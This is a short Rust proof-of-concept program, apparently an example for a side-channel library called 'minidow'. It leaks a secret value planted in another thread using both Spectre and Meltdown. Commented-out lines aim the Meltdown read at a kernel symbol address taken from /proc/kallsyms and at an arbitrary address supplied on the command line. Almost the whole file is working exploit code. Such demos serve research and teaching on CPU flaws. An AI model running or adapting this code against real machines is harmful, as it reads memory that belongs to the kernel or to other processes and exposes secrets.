use minidow::*;

fn main() {
    setup_measurements();

    let (tx, rx) = std::sync::mpsc::channel();

    std::thread::spawn(move || {
        let secret: usize = 0x1ff23ff45ff67ff8;
        tx.send(&secret as *const _ as usize).unwrap();
        loop {}
    });

    let secret_addr = rx.recv().unwrap();

    let spectre = Spectre::new(None, None, None, None);

    /*
    println!(
        "With Meltdown: 0x{:x}",
        read_ptr(&spectre,
            || {
                std::fs::read_to_string("/proc/version").unwrap();
            },
            // address of linux_proc_banner, listed in /proc/kallsyms
            0xffffffffb0200160
        )
    );
    */

    println!(
        "With Spectre: 0x{:x}",
        read_ptr(&spectre, || {}, secret_addr)
    );

    println!(
        "With Meltdown: 0x{:x}",
        read_ptr(&Meltdown, || {}, secret_addr)
    );

    /*
    let arg = std::env::args().skip(1).take(1).next().unwrap();
    let addr = usize::from_str_radix(&arg[2..], 16).unwrap();
    println!("With Spectre: 0x{:x}", read_ptr::<Spectre>(|| {}, addr));
    */
}
